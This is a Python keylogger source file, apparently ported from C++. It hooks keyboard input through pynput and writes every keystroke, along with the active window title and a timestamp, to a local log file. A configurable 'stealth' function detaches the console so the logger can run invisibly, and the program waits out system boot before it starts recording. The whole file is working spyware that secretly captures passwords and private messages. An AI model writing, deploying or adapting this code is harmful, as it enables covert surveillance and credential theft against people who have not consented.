import time
import os
import ctypes
from pynput import keyboard
from datetime import datetime

# Configuration settings (similar to C++ defines)
VISIBLE = True  # Set to False for invisible
BOOT_WAIT = True  # Set to False to skip boot wait
FORMAT = 0  # 0 for default, 10 for decimal, 16 for hex
MOUSE_IGNORE = True  # Ignore mouse clicks

# Define key names as in the original C++ map for FORMAT 0
keyname = {
    8: "[BACKSPACE]",
    13: "\n",  # Enter key
    32: "_",  # Space
    9: "[TAB]",
    16: "[SHIFT]",
    17: "[CONTROL]",
    18: "[ALT]",
    27: "[ESCAPE]",
    35: "[END]",
    36: "[HOME]",
    37: "[LEFT]",
    38: "[UP]",
    39: "[RIGHT]",
    40: "[DOWN]",
    33: "[PG_UP]",
    34: "[PG_DOWN]",
    190: ".",  # Period
    189: "-",  # Dash
    187: "+",  # Plus
    20: "[CAPSLOCK]",
}

# Variable to store the previous window title
last_window = ""

# Output file to log keystrokes
output_filename = "keylogger.log"
output_file = None

# Check if the system is still booting
def is_system_booting():
    return ctypes.windll.user32.GetSystemMetrics(44) != 0  # SM_SYSTEMDOCKED equivalent in Python

# Function to handle key presses
def on_press(key):
    global last_window, output_file

    # Handle special keys
    try:
        key_code = key.vk
    except AttributeError:
        return  # Ignore non-character keys

    if MOUSE_IGNORE and (key_code == 1 or key_code == 2):  # Mouse click keys to ignore
        return

    # Get the current window title
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    window_title = ctypes.create_unicode_buffer(256)
    ctypes.windll.user32.GetWindowTextW(hwnd, window_title, 256)

    if window_title.value != last_window:
        last_window = window_title.value
        # Get the current time and format it
        current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S%z")
        output_file.write(f"\n\n[Window: {window_title.value} - at {current_time}] ")

    # Format the key output
    if FORMAT == 0:
        key_str = keyname.get(key_code, chr(key_code).lower())
    elif FORMAT == 10:
        key_str = f"[{key_code}]"
    elif FORMAT == 16:
        key_str = f"[{hex(key_code)}]"
    else:
        key_str = chr(key_code)

    output_file.write(key_str)
    output_file.flush()

# Function to make the console window visible or invisible
def stealth():
    if VISIBLE:
        os.system("title Keylogger")  # Set console title (it'll be visible)
    else:
        ctypes.windll.kernel32.FreeConsole()  # Detach from the console window

# Main entry point
def main():
    global output_file

    # Make the window visible or invisible
    stealth()

    # Wait for the system to finish booting, if required
    if BOOT_WAIT:
        while is_system_booting():
            print("System is still booting up. Waiting 10 seconds to check again...")
            time.sleep(10)

    # Open the log file for appending
    print(f"Logging output to {output_filename}")
    output_file = open(output_filename, 'a')

    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
